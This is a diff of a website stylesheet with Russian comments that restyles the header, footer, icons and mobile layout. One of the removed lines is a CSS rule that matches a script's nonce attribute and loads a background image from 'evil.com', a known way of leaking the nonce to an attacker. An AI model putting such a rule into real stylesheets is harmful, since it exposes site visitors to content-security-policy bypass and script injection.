@@ -1,118 +1,191 @@
+@import url('https://fonts.googleapis.com/icon?family=Material+Icons');
+
 * {
     padding: 0;
     margin: 0;
+    box-sizing: border-box;
+    transition: all 0.3s ease-in-out;
 }
 
-html {
-    height: 100%;
-}
-
-body {
+html, body {
     height: 100%;
     display: flex;
-    flex-direction:column;
+    flex-direction: column;
+    padding-right: 0 !important;
 }
 
 #mainHeader {
-    color: #FEEFFD;
-    min-height: 7%;
-    width: 100%;
-    position: absolute;
-    top: 0;
-    left: 0;
-    background: rgb(218,137,226);
-    background: linear-gradient(159deg, rgba(218,137,226,1) 0%, rgba(197,118,204,1) 8%, rgba(176,99,183,1) 20%, rgba(173,97,180,1) 26%, rgba(161,86,168,1) 46%, rgba(146,73,152,1) 67%, rgba(126,56,132,1) 87%, rgba(126,56,132,1) 100%);
+    color: #FEEFFD !important;
+    width: 100% !important;
+    position: fixed !important;
+    top: 0 !important;
+    left: 0 !important;
+    background: linear-gradient(159deg, rgba(218,137,226,1) 0%, rgba(197,118,204,1) 8%, rgba(176,99,183,1) 20%, rgba(126,56,132,1) 87%) !important;
+    z-index: 10 !important;
+    box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1) !important;
+    padding: 10px 0 !important;
+    height: 113px !important;
 }
 
-.col img {
-    max-width: 85%;
-    height: auto; /* Избегаем растягивания изображения */
-    display: block; /* Убираем лишнее пространство вокруг изображения */
+#mainHeader .nav-link {
+    color: #FEEFFD !important;
+    display: flex !important;
+    flex-direction: column !important;
+    align-items: center !important;
+    gap: 5px !important;
+    font-size: 12px !important;
+    transition: color 0.3s ease;
+    position: relative !important;
 }
 
-.form_img {
-    margin-left: auto;
-    margin-right: auto;
+#mainHeader .nav-link:hover {
+    color: #E0BBE4;
+}
+
+#mainHeader .material-icons {
+    font-size: 24px;
+    transition: transform 0.3s ease;
+}
+
+#mainHeader .material-icons:hover {
+    transform: scale(1.2);
+}
+
+#mainHeader .nav-link .icon-label {
+    display: block;
+    font-size: 12px;
+}
+
+#mainHeader .nav-link:hover .icon-label {
+    display: block;
+}
+
+/* Скрываем подпись на малых экранах и показываем ее при наведении */
+@media (max-width: 768px) {
+    #mainHeader .nav-link .icon-label {
+        display: none;
+    }
+
+    #mainHeader .nav-link:hover .icon-label {
+        display: block;
+        position: absolute;
+        background-color: rgba(0, 0, 0, 0.7);
+        color: #fff;
+        padding: 3px 6px;
+        border-radius: 4px;
+        top: 35px;
+        white-space: nowrap;
+    }
 }
 
 main {
     flex: 1;
-    background: rgb(254,240,255);
-    background: radial-gradient(circle at 95% 5%, rgba(254,240,255,1) 0%, rgba(254,239,253,1) 14%, rgba(254,239,252,1) 28%, rgba(254,238,251,1) 48%, rgba(254,238,250,1) 55%, rgba(255,230,235,1) 79%, rgba(255,226,226,1) 100%);
-    margin-top: 100px;
+    margin-top: 115px; /* Отступ для фиксированного header */
+    padding-top: 20px;
+    background: radial-gradient(circle at 95% 5%, rgba(254,240,255,1) 0%, rgba(255,226,226,1) 100%);
 }
 
 footer {
     color: #FEEFFD;
-    background: rgb(218, 137, 226);
-    background: linear-gradient(159deg, rgba(218, 137, 226, 1) 0%, rgba(197, 118, 204, 1) 8%, rgba(176, 99, 183, 1) 20%, rgba(173, 97, 180, 1) 26%, rgba(161, 86, 168, 1) 46%, rgba(146, 73, 152, 1) 67%, rgba(126, 56, 132, 1) 87%, rgba(126, 56, 132, 1) 100%);
+    background: linear-gradient(159deg, rgba(218,137,226,1) 0%, rgba(197,118,204,1) 100%);
+    padding: 20px 10px;
     width: 100%;
-    padding: 20px 0; /* Установка внутреннего отступа */
-    box-sizing: border-box;
+    display: flex;
+    align-items: center;
+    justify-content: center;
 }
 
-.container {
-    width: 80%; /* Примерная ширина контейнера, можно настроить по своему усмотрению */
-    margin: 0 auto; /* Центрирование контейнера */
-}
-
-.row {
+footer .container {
     display: flex;
     flex-wrap: wrap;
-    justify-content: space-between; /* Равномерное распределение между колонками */
+    justify-content: space-between;
+    max-width: 1200px; /* Ограничение ширины для лучшей читаемости */
 }
 
-.col {
-    flex: 1 1 40%; /* Гибкий размер колонки */
-    margin-bottom: 20px; /* Внешний отступ между колонками */
+footer .row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 2px;
+    width: 100%;
 }
 
+/* Колонки с большим отступом для воздуха */
+footer .col {
+    flex: 1 1 45%;
+    margin: 1px;
+    min-width: 250px;
+    text-align: center;
+}
+
+footer .pfooter {
+    display: flex;
+    color: #FEEFFD;
+    align-items: center;
+    gap: 10px;
+    justify-content: center;
+}
+
+footer .pfooter .material-icons {
+    font-size: 22px;
+    transition: transform 0.3s ease;
+    line-height: 1;
+}
+
+footer .pfooter:hover .material-icons {
+    transform: scale(1.2); /* Увеличение иконки */
+}
+
+footer .afooter {
+    color: #FEEFFD;
+    text-decoration: none;
+    transition: color 0.3s;
+}
+
+footer .afooter:hover {
+    color: #FFFFFF; /* Подсветка ссылки */
+}
+
+/* Логотип с плавной анимацией */
+footer .form_img img {
+    width: 220px;
+    height: auto;
+    transition: transform 0.4s ease;
+}
+
+footer .form_img:hover img {
+    transform: scale(1.1); /* Легкое увеличение логотипа */
+}
+
+/* Стили заголовков для подвала */
+footer h2 {
+    font-size: 1.5em;
+    margin-bottom: 15px;
+    color: #FFFFFF;
+    text-align: center;
+    font-weight: bold;
+    transition: color 0.3s ease;
+}
+
+footer h2:hover {
+    color: #E0BBE4; /* Плавное изменение цвета заголовка */
+}
+
+/* Адаптивность для мобильных устройств */
 @media (max-width: 768px) {
-    .row {
+    footer .container {
+        flex-direction: column;
+        text-align: center;
+    }
+    footer .row {
         flex-direction: column;
     }
-
-    .col {
-        width: 100%;
-        margin-bottom: 10px; /* Уменьшенный внешний отступ на мобильных устройствах */
+    footer .col {
+        min-width: 100%;
+        margin-bottom: 20px;
     }
 }
 
-.pfooter {
-    margin: 5px 0; /* Отступы для параграфов внутри колонок */
+.margin-top {
+    margin-top: 6px;
+    padding-bottom: 5px;
 }
-
-.afooter {
-    font-size: 100%;
-    color: hsl(304deg 60.74% 94.46%);
-    text-decoration: none;
-}
-
-.afooter:hover {
-    color: oklch(0.87 0.11 328.44);
-}
-
-.centr {
-    width: 96%;
-    margin-left: auto;
-    margin-right: auto;
-}
-
-.centr-100 {
-    width: 100%;
-    margin-left: auto;
-    margin-right: auto;
-}
-
-script[nonce~="whatever"] {
-    background: url("https://evil.com/nonce?whatever");
-}
-
-.container .h2 {
-    color: oklab(0.85 0.09 -0.08);
-}
-
-img {
-    height: 50px;
-}
-
